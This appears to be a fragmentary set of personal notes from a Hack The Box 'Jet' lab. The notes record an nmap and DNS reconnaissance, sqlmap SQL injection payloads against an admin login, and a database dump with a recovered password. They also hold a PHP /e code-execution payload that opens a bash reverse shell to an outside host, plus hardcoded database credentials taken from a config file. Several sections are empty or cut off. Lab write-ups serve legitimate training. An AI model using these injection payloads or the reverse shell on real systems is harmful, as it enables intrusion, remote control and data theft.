# - Fortress JET -
- [+] : Target IP
   >>	10.13.37.10
## - RECON -
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
5555/tcp open  freeciv
7777/tcp open  cbt




- [+] : Introduction
   >>	Lift off with this introductory fortress from Jet! Featuring interesting web vectors and challenges, this fortress is perfect for those getting started.
   
- [+] : Connect
   >>	http://10.13.37.10/
   
- [+] : Digging in...
   >>	DNS recon :
   
		   ┌─[parrot@parrot]─[~/Desktop/HackingLab/HackTheBox/Fortresses/jet]
		└──╼ $dig @10.13.37.10 -x 10.13.37.10

		; <<>> DiG 9.18.24-1-Debian <<>> @10.13.37.10 -x 10.13.37.10
		; (1 server found)
		;; global options: +cmd
		;; Got answer:
		;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 53661
		;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
		;; WARNING: recursion requested but not available

		;; OPT PSEUDOSECTION:
		; EDNS: version: 0, flags:; udp: 4096
		;; QUESTION SECTION:
		;10.37.13.10.in-addr.arpa.	IN	PTR

		;; AUTHORITY SECTION:
		37.13.10.in-addr.arpa.	604800	IN	SOA	www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800

		;; Query time: 70 msec
		;; SERVER: 10.13.37.10#53(10.13.37.10) (UDP)
		;; WHEN: Fri Jun 14 02:42:31 BST 2024
		;; MSG SIZE  rcvd: 109


- [+] : 2 domains 
   >>	www.securewebinc.jet. securewebinc.jet.

1718330397

- [+] : 
   >>	
└──╼ $sqlmap -u "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" --data="username=admin&password=admin"
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 6234=6234 AND 'glnu'='glnu&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 2321 FROM(SELECT COUNT(*),CONCAT(0x716a627071,(SELECT (ELT(2321=2321,1))),0x7171706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'lDEi'='lDEi&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 4067 FROM (SELECT(SLEEP(5)))FnPm) AND 'tDUA'='tDUA&password=admin

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=-1736' UNION ALL SELECT NULL,CONCAT(0x716a627071,0x636a72644a4e42544c6e7050567a564c576d436c537a416f7a524742776b7454444374455363464b,0x7171706271),NULL-- -&password=admin
---
[04:02:05] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3, PHP
back-end DBMS: MySQL >= 5.0
[04:02:06] [INFO] fetched data logged to text files under '/home/parrot/.local/share/sqlmap/output/www.securewebinc.jet'

[*] ending @ 04:02:06 /2024-07-07/


available databases [2]:                                                       
[*] information_schema
[*] jetadmin

$sqlmap -u "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php" --data="username=admin&password=admin" -D jetadmin -T users --columns --dump --batch
Hackthesystem200

*/e
system('bash -c "/bin/bash -i >& /dev/tcp/10.10.14.2/1234 0>&1"')


- [+] : 
   >>	

$servername = "localhost";
$username = "jet";
$password = "dcr46kdl6zsld68idtyufldro";

// Create connection
$conn = new mysqli($servername, $username, $password,'jetadmin');

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

/* User Creation
$username = 'admin';
$password = 'apasswordhere';
$hashPassword = password_hash($password,PASSWORD_BCRYPT);

$sql = "insert into users (username, password) valu

## - RECON -

- [+] : 
   >>	
--data=username=admin&
- [+] : 
   >>	

- [+] : 
   >>	

- [+] : 
   >>	

- [+] : 
   >>	

   
